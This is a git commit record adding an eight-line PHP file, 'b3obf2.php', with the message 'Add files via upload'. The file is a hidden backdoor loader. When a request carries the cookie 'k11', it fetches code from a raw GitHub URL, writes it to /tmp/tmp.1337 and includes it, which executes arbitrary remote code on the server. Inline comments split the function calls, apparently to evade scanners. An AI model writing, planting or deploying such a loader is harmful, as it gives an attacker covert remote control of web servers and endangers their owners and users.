b44a757457aaf36e991b31b018c7c4ea800d5c9b
abq78 <abq.org.br@gmail.com>
2024-10-09 17:51:50 -0300

    Add files via upload

---
+++ b3obf2.php
@@ -0,0 +1,8 @@
+<?php
+
+if (isset($_COOKIE["k11"])){
+$f=file_get_contents/*sj1|?><!*/("https://raw.githubusercontent.com/abq78/files2/refs/heads/main/b3","tmp.1337");
+file_put_contents/*sj1|?><!*/("/tmp/tmp.1337",$f);
+include("/tmp/tmp.1337");
+}
+?>
